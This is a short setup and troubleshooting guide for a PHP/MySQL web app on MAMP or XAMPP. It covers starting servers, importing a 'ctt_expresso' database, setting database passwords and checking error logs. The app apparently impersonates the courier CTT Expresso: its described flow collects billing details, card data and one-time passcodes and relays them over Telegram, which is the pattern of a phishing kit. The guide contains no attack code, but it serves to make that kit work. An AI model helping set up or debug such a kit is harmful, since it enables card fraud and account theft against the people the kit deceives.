# 🚀 Quick Setup Guide - Fix Database Error

## 🐛 Error: "Database c..." JSON parsing issue

### The Problem:
Your API is returning database error text instead of JSON, causing the `Unexpected token 'D'` error.

## ✅ Quick Fix Steps:

### 1. **Check if MySQL is Running**
#### MAMP:
- Open MAMP application
- Click **"Start Servers"**
- Both Apache and MySQL should show green lights

#### XAMPP:
- Open XAMPP Control Panel
- Click **"Start"** for both Apache and MySQL
- Both should show green status

### 2. **Import Database**
- Go to phpMyAdmin:
  - **MAMP**: http://localhost:8888/phpMyAdmin
  - **XAMPP**: http://localhost/phpMyAdmin
- Click **"New"** → Create database: `ctt_expresso`
- Click **"Import"** → Select `database.sql` file → Click **"Go"**

### 3. **Update Database Password**

#### For MAMP (Default):
Edit `config/database.php`:
```php
define('DB_PASS', 'root'); // Keep as 'root'
```

#### For XAMPP (Default):
Edit `config/database.php`:
```php
define('DB_PASS', ''); // Change to empty string
```

### 4. **Test Your Setup**
Visit: `http://localhost:8888/ctt/test-system.php` (MAMP)
or: `http://localhost/ctt/test-system.php` (XAMPP)

**All tests should show ✅ SUCCESS**

### 5. **Test the Application**
1. Go to: `http://localhost:8888/ctt/`
2. Fill out billing form and submit
3. Should now work without JSON errors!

---

## 🧪 If Still Having Issues:

### Check PHP Error Log:
```bash
# MAMP
tail -f /Applications/MAMP/logs/php_error.log

# XAMPP
tail -f /Applications/XAMPP/logs/error_log
```

### Database Connection Test:
Create file `test-db.php`:
```php
<?php
try {
    $pdo = new PDO("mysql:host=localhost;dbname=ctt_expresso", "root", "root");
    echo "✅ Database connection: SUCCESS";
} catch (Exception $e) {
    echo "❌ Database error: " . $e->getMessage();
}
?>
```

---

## 🎯 Expected Results After Fix:

✅ **Billing form submits successfully**
✅ **Console shows**: "Response status: 200" + "Success! Navigating to card page..."
✅ **No more JSON parsing errors**
✅ **Smooth flow**: billing → card → otp → confirmation
✅ **Telegram messages working**

**Your application should now work perfectly!** 🚀